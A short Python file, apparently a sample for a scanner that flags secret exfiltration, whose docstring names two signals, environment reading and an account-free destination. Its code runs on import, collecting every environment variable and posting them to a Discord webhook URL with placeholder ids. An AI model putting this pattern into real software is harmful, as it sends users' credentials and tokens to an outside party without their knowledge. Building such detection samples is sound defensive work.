"""Application code that posts the environment to a chat webhook.

Two signals rather than three: reading the environment, and a destination that
needs no account and no infrastructure. That destination is what makes the pair
sufficient.
"""

import os

import urllib.request

urllib.request.urlopen(
    "https://discord.com/api/webhooks/000000/aaaaaaaa",
    str(dict(os.environ)).encode(),
)
